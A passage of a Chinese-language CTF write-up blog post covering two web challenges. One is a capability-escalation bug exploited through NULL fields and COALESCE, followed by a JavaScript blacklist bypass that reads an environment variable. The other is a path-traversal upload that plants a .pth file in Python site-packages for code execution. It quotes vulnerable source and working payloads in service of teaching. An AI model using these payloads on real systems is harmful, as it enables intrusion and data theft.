+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs text"> if (req.method === &#x27;POST&#x27; &amp;&amp; pathname === &#x27;/api/release/claim&#x27;) &#123;<br>    const claims = requireSession(req);  //这里是校验token<br>    const effectiveCap = await getEffectiveCapability(claims.sid);<br>    assertReleaseCapability(effectiveCap);//这里是判断if (cap.role !== &#x27;maintainer&#x27; || cap.lane !== &#x27;release&#x27;)，不满足就报错了<br><br>    if (claims.role !== &#x27;guest&#x27;) &#123;<br>      throw new Error(&#x27;release claim requires guest-origin session&#x27;);<br>    &#125;//虽然当前capability必须是maintainer或者release，但token本身的claims.role还必须是guest<br><br>    const body = await collectJsonBody(req);<br>    if (!body || typeof body !== &#x27;object&#x27;) &#123;<br>      throw new Error(&#x27;claim body must be object&#x27;);<br>    &#125;<br><br>    const payload = body as Record&lt;string, unknown&gt;;<br>    const nonce = typeof payload.nonce === &#x27;string&#x27; ? payload.nonce.trim() : &#x27;&#x27;;<br>    const proof = typeof payload.proof === &#x27;string&#x27; ? payload.proof.trim() : &#x27;&#x27;;<br><br>    if (!/^[a-f0-9]&#123;24&#125;$/i.test(nonce)) &#123;<br>      throw new Error(&#x27;invalid challenge nonce&#x27;);<br>    &#125;<br><br>    if (!/^[a-f0-9]&#123;40&#125;$/i.test(proof)) &#123;<br>      throw new Error(&#x27;invalid release proof format&#x27;);<br>    &#125;<br><br>    const expected = computeReleaseProof(claims.sid, nonce);/*服务端会自己算一个proof，然后提交的对比。<br>这样写的return crypto.createHash(&#x27;sha1&#x27;).update(`$&#123;sid&#125;:$&#123;nonce&#125;:$&#123;RUNNER_KEY&#125;`).digest(&#x27;hex&#x27;);*/<br>    if (proof.toLowerCase() !== expected) &#123;<br>      throw new Error(&#x27;release proof mismatch&#x27;);<br>    &#125;<br><br>    await consumeReleaseChallenge(claims.sid, nonce);<br><br>    sendJson(res, 200, &#123;<br>      ok: true,<br>      sid: claims.sid,<br>      flag: FLAG_VALUE<br>    &#125;);<br>    return;<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>说明需要session的effective capability 必须通过assertReleaseCapability()的检查，token本身的claims.role仍然必须是guest才能通过，</p>
+<p>就是说伪造个maintainer的token好像不行，必须让一个guest的session拥有maintainer的capability，并且proof 校验要通过，才能获得flag。</p>
+<p>然后我们看到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">async function getEffectiveCapability(sid: string): Promise&lt;CapabilityView&gt; &#123;<br>  const rows = await db`<br>    SELECT<br>      id,<br>      sid,<br>      COALESCE(role, &#x27;maintainer&#x27;) AS role,<br>      COALESCE(lane, &#x27;release&#x27;) AS lane,<br>      source,<br>      note,<br>      stamp<br>    FROM capability_snapshots<br>    WHERE sid = $&#123;sid&#125;<br>    ORDER BY id DESC<br>    LIMIT 1<br>  `;<br></code></pre></td></tr></table></figure>
+
+<p>COALESCE()会返回参数列表中第一个非 NULL 的值，如果数据库里的role&#x2F;lane是NULL，系统就会role &#x3D; maintainer 和lane &#x3D; release</p>
+<p>那我们怎么把他变成NULL呢，我们继续看</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">if (req.method === &#x27;POST&#x27; &amp;&amp; pathname === &#x27;/api/caps/sync&#x27;) &#123;<br>   const claims = requireSession(req);<br>   assertGuest(claims);<br><br>   const body = await collectJsonBody(req);<br>   const rows = normalizeSyncRows(body, claims);//把请求体读出来<br>   await appendCapabilityRows(rows);//把传过来的body处理成一个数组rows，里面每一项都是一条准备插入数据库的capability记录。<br><br>   sendJson(res, 200, &#123;<br>     ok: true,<br>     sid: claims.sid,<br>     inserted: rows.length,<br>     hint: &#x27;capability snapshots synced&#x27;<br>   &#125;);<br>   return;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>处理完后还有个push会加上一条<code>source: &#39;server-tail&#39;,</code>也算个安全的兜底机制吧</p>
+<p>真正写入数据库的是</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">async function appendCapabilityRows(rows: Array&lt;Record&lt;string, unknown&gt;&gt;): Promise&lt;void&gt; &#123;<br>  if (!rows.length) &#123;<br>    return;<br>  &#125;<br><br>  const firstRowKeys = Object.keys(rows[0]); //这里会取出第一条记录有哪些字段<br>  const shapedRows = rows.map((row) =&gt; &#123;<br>    const out: Record&lt;string, unknown&gt; = &#123;&#125;;<br>    for (const key of firstRowKeys) &#123;<br>      out[key] = Object.prototype.hasOwnProperty.call(row, key) ? row[key] : null;<br>    &#125;<br>    return out;<br>  &#125;);<br><br>  await db`INSERT INTO capability_snapshots $&#123;db(shapedRows as unknown as Record&lt;string, unknown&gt;[])&#125;`;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里是把多条 capability 记录批量插进数据库，看到这<code>const firstRowKeys = Object.keys(rows[0]);</code> ，这里会取出第一条记录有哪些字段</p>
+<p>在结合后面的代码，也就是说：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">如果第一条是：&#123; a: &quot;1&quot;, b: &quot;2&quot;, c: &quot;3&quot;, d: &quot;4&quot; &#125;<br>那么firstRowKeys 就是：[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]<br></code></pre></td></tr></table></figure>
+
+<p>如果当前这条有这个字段，就用原值，如果没有，就填 NULL。说到NULl自动联系到前面的COALESCE()</p>
+<p>所以现在思路就清楚了：</p>
+<ol>
+<li>想办法让第一条记录不带 <code>role/lane</code></li>
+<li>这样整批插入后的记录都会丢掉 <code>role/lane</code></li>
+<li>数据库里最新一条记录的 <code>role/lane</code> 就会变成 NULL</li>
+<li>查询 <code>effective capability</code> 时，再被 <code>COALESCE()</code> 自动解释成 <code>maintainer/release</code></li>
+</ol>
+<p>那怎样让第一条记录不带role&#x2F;lane呢？继续看</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">const keepRole = input.keepRole !== false;<br>    const keepLane = input.keepLane !== false;<br><br>    const row: Record&lt;string, unknown&gt; = &#123;<br>      sid: claims.sid,<br>      source,<br>      note,<br>      stamp: now + i<br>    &#125;;<br><br>    if (keepRole) &#123;<br>      row.role = &#x27;guest&#x27;;<br>    &#125;<br><br>    if (keepLane) &#123;<br>      row.lane = &#x27;public&#x27;;<br>    &#125;<br><br>    rows.push(row);<br></code></pre></td></tr></table></figure>
+
+<p>也就是说，只要传入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&#123;<br>  &quot;keepRole&quot;: false,<br>  &quot;keepLane&quot;: false<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第一条记录就没有role&#x2F;lane，然后看到数据库取当前 capability 的方式是：<code>ORDER BY id DESC LIMIT 1</code>，也就是说，最后插入的那一条会被当成当前有效capability。</p>
+<p>我们一开始关注的是<code>/api/release/claim</code>，但是proof 校验我们不知道key过不去，我又想起了一开头ban的东西，然后跟进一下来到了这边</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs text">if (req.method === &#x27;POST&#x27; &amp;&amp; pathname === &#x27;/api/release/execute&#x27;) &#123;<br>    const claims = requireSession(req);<br>    const effectiveCap = await getEffectiveCapability(claims.sid);<br>    assertReleaseCapability(effectiveCap);<br><br>    const body = await collectJsonBody(req);<br>    if (!body || typeof body !== &#x27;object&#x27;) &#123;<br>      throw new Error(&#x27;execute body must be object&#x27;);<br>    &#125;<br><br>    const payload = body as Record&lt;string, unknown&gt;;<br>    const expression = typeof payload.expression === &#x27;string&#x27; ? payload.expression : &#x27;&#x27;;<br>    const input = Object.prototype.hasOwnProperty.call(payload, &#x27;input&#x27;) ? payload.input : &#123;&#125;;<br><br>    const output = await executeExpression(expression, input, claims, effectiveCap);<br><br>    const exprHash = crypto.createHash(&#x27;sha1&#x27;).update(expression).digest(&#x27;hex&#x27;);<br>    await db`INSERT INTO release_runs $&#123;db(&#123;<br>      sid: claims.sid,<br>      expr_hash: exprHash,<br>      output_preview: JSON.stringify(output).slice(0, 360),<br>      created_at: Date.now()<br>    &#125;)&#125;`;<br><br>    sendJson(res, 200, &#123;<br>      ok: true,<br>      cap: &#123;<br>        id: effectiveCap.id,<br>        role: effectiveCap.role,<br>        lane: effectiveCap.lane,<br>        source: effectiveCap.source<br>      &#125;,<br>      result: output<br>    &#125;);<br>    return;<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>assertReleaseCapability(effectiveCap);</code>我们前面已经把 capability 提上来了，所以这个检查已经能过，然后就是绕黑名单，因为给了flag所在的位置在<code>process.env.FLAG_VALUE</code>，我们直接构造，关键词拼接就能绕过了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">[][&quot;filter&quot;][&quot;constr&quot;+&quot;uctor&quot;](&quot;return pro&quot;+&quot;cess.env.FLAG_VALUE&quot;)()<br></code></pre></td></tr></table></figure>
+
+<p>先获取guest token</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /api/auth/guest<br></code></pre></td></tr></table></figure>
+
+<p>然后用 <code>/api/caps/sync</code> 造出 NULL capability</p>
+<p><img src="/img/polarisctf-2025/img-11.png" alt="9c4ff52a-4df1-4184-b50c-55f2e8c2a15a-20260401210116-eyfnru1"></p>
+<p>最后用 <code>/api/release/execute</code> 触发表达式执行</p>
+<p><img src="/img/polarisctf-2025/img-12.png" alt="a8f2506d-47c0-4245-964e-7ac76115830c-20260401210141-eg56l9l"></p>
+<h2 id="AutoPypy"><a href="#AutoPypy" class="headerlink" title="AutoPypy"></a>AutoPypy</h2><p>给了源码先看看，先看&#x2F;upload接口，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs text">#server.py<br>@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])<br>def upload():<br>    if &#x27;file&#x27; not in request.files:<br>        return &#x27;No file part&#x27;, 400<br>    <br>    file = request.files[&#x27;file&#x27;]<br>    filename = request.form.get(&#x27;filename&#x27;) or file.filename<br>    <br>    save_path = os.path.join(UPLOAD_FOLDER, filename)<br>    <br>    save_dir = os.path.dirname(save_path)<br>    if not os.path.exists(save_dir):<br>        try:<br>            os.makedirs(save_dir)<br>        except OSError:<br>            pass<br><br>    try:<br>        file.save(save_path)<br>        return f&#x27;成功上传至: &#123;save_path&#125;&#x27;<br>    except Exception as e:<br>        return f&#x27;上传失败: &#123;str(e)&#125;&#x27;, 500<br></code></pre></td></tr></table></figure>
+
+<p>这里 filename 是用户可控的，并且没有做任何过滤。</p>
+<p>如果传入..&#x2F;..&#x2F;test.py，实际保存路径会变成&#x2F;app&#x2F;uploads&#x2F;..&#x2F;..&#x2F;test.py，也就是&#x2F;app&#x2F;test.py</p>
+<p>再看到&#x2F;run接口</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">@app.route(&#x27;/run&#x27;, methods=[&#x27;POST&#x27;])<br>def run_code():<br>    data = request.get_json()<br>    filename = data.get(&#x27;filename&#x27;)<br><br>    target_file = os.path.join(&#x27;/app/uploads&#x27;, filename)<br><br>    launcher_path = os.path.join(BASE_DIR, &#x27;launcher.py&#x27;)<br><br>    try:<br>        proc = subprocess.run(<br>            [sys.executable, launcher_path, target_file],<br>            capture_output=True,<br>            text=True,<br>            timeout=5,<br>            cwd=BASE_DIR <br>        )<br>        return jsonify(&#123;&quot;output&quot;: proc.stdout + proc.stderr&#125;)<br>    except subprocess.TimeoutExpired:<br>        return jsonify(&#123;&quot;output&quot;: &quot;Timeout&quot;&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>这里是调用python去运行<code>launcher.py</code>，并且把filename当参数传过去，就是</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">python launcher.py filename<br></code></pre></td></tr></table></figure>
+
+<p>那我们看看<code>launcher.py</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">import subprocess<br>import sys<br><br>def run_sandbox(script_name):<br>    print(&quot;Launching sandbox...&quot;)<br>    cmd = [<br>        &#x27;proot&#x27;,<br>        &#x27;-r&#x27;, &#x27;./jail_root&#x27;,<br>        &#x27;-b&#x27;, &#x27;/bin&#x27;,<br>        &#x27;-b&#x27;, &#x27;/usr&#x27;,<br>        &#x27;-b&#x27;, &#x27;/lib&#x27;,<br>        &#x27;-b&#x27;, &#x27;/lib64&#x27;,<br>        &#x27;-b&#x27;, &#x27;/etc/alternatives&#x27;,<br>        &#x27;-b&#x27;, &#x27;/dev/null&#x27;,<br>        &#x27;-b&#x27;, &#x27;/dev/zero&#x27;,<br>        &#x27;-b&#x27;, &#x27;/dev/urandom&#x27;,<br>        &#x27;-b&#x27;, f&#x27;&#123;script_name&#125;:/app/run.py&#x27;,<br>        &#x27;-w&#x27;, &#x27;/app&#x27;,<br>        &#x27;python3&#x27;, &#x27;run.py&#x27;<br>    ]<br>    subprocess.call(cmd)<br>    print(&quot;ok&quot;)<br><br>if __name__ == &quot;__main__&quot;:<br>    script = sys.argv[1]<br>    run_sandbox(script)<br></code></pre></td></tr></table></figure>
+
+<p>看起来是把代码丢进 proot 执行。</p>
+<p>再看 server.py 最下面：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">if __name__ == &#x27;__main__&#x27;:<br>    import site<br>    print(f&quot;[*] Server started.&quot;)<br>    print(f&quot;[*] Upload Folder: &#123;UPLOAD_FOLDER&#125;&quot;)<br>    print(f&quot;[*] Target site-packages (Try to reach here): &#123;site.getsitepackages()[0]&#125;&quot;)<br>    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)<br></code></pre></td></tr></table></figure>
+
+<p>基本明示了目标点在 site-packages。Python 在启动时会自动处理 <code>site-packages</code> 目录下的 <code>.pth</code> 文件，如果 <code>.pth</code> 文件中某一行以 <code>import</code> 开头，这行代码就会被自动执行。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">所以我们的利用思路就很明显了<br>先通过 `/upload` 的路径穿越把文件写到宿主机的 `site-packages`，然后写入一个`.pth` 文件，再调用`/run`触发<br></code></pre></td></tr></table></figure>
+
+<p>.pth可以这样写</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">import os;print(open(&#x27;/flag&#x27;).read())<br></code></pre></td></tr></table></figure>
+
+<p>利用目录穿越上传到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">../../usr/local/lib/python3.10/site-packages/Xendr1a.pth<br></code></pre></td></tr></table></figure>
+
+<p>随便写个不存在的文件&#x2F;run一下就行了</p>
+<p><img src="/img/polarisctf-2025/img-13.png" alt="fb5a831f-773c-4204-81a5-41a8efbc69f4-20260405220610-gub3j5s"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后面虚拟机挂着codex也出了好几题，但是感觉不是自己做的发出来怪怪的，那几题就不发了，自己拿去慢慢吃了，最近也不知道怎么没心思学了，慢慢调整状态吧。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/PolarisCTF/" class="category-chain-item">PolarisCTF</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Writeup/" class="print-no-link">#Writeup</a>
+      
+        <a href="/tags/PolarisCTF/" class="print-no-link">#PolarisCTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PolarisCTF 招新赛 Web 部分</div>
+      <div>https://xendr1a.github.io/2026/03/05/polarisctf-2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/20/buu/" title="BUUCTF Web 题解合集">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF Web 题解合集</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/07/yii-deserialization/" title="Yii 反序列化漏洞复现">
+                        <span class="hidden-mobile">Yii 反序列化漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
